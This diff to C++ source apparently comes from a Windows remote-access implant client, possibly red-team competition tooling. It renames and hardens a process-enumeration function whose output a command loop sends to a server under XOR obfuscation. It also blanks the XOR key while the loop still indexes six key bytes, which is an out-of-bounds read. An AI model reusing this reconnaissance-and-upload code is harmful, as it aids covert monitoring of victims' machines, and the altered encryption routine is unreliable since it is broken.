@@ -30,7 +30,7 @@ using namespace std;
 
 // used to encrypt/decrypt data
 void xor_func(char * data, int len) {
-	const char * key = "RITSEC";
+	const char * key = "";
 	for (int i = 0; i < len; i++) {
 		unsigned char kb = data[i] ^ key[i % 6];
 		if (data[i] != 0x00 && kb != 0x00) {
@@ -205,25 +205,29 @@ std::string getSysInfo() {
 }
 
 //get data from process and turn it into human readable/understandable information
-std::string getProc() {
-	std::string proclst;
-	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	PROCESSENTRY32 procEntry;
-	procEntry.dwSize = sizeof(PROCESSENTRY32);
-	Process32First(hTH32, &procEntry);
-	do {
-		std::wstring wpname(procEntry.szExeFile);
-		std::string pname(wpname.begin(), wpname.end());
-		proclst += pname;
-		proclst += ":";
-		char buf[UNLEN + 1];
-		DWORD len = UNLEN + 1;
-		_itoa_s(procEntry.th32ProcessID, buf, 10);
-		buf[UNLEN] = 0;
-		proclst += buf;
-		proclst += "\n";
-	} while (Process32Next(hTH32, &procEntry));
-	return proclst;
+std::string listProcesses() {
+    std::string processList;
+    HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hTH32 != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 procEntry;
+        procEntry.dwSize = sizeof(PROCESSENTRY32);
+        if (Process32First(hTH32, &procEntry)) {
+            do {
+                std::wstring wpname(procEntry.szExeFile);
+                std::string pname(wpname.begin(), wpname.end());
+                processList += pname;
+                processList += ":";
+                char buf[UNLEN + 1];
+                DWORD len = UNLEN + 1;
+                _itoa_s(procEntry.th32ProcessID, buf, 10);
+                buf[UNLEN] = 0;
+                processList += buf;
+                processList += "\n";
+            } while (Process32Next(hTH32, &procEntry));
+        }
+        CloseHandle(hTH32);
+    }
+    return processList;
 }
 
 // Client uploads to server.
@@ -389,7 +393,7 @@ int main(int argc, char const* argv[]) {
 				break;
 			case 2:
 				puts("processes");
-				procs = getProc();
+				procs = listProcesses();
 				length = procs.length();
 				thing = (char *) malloc(length);
 
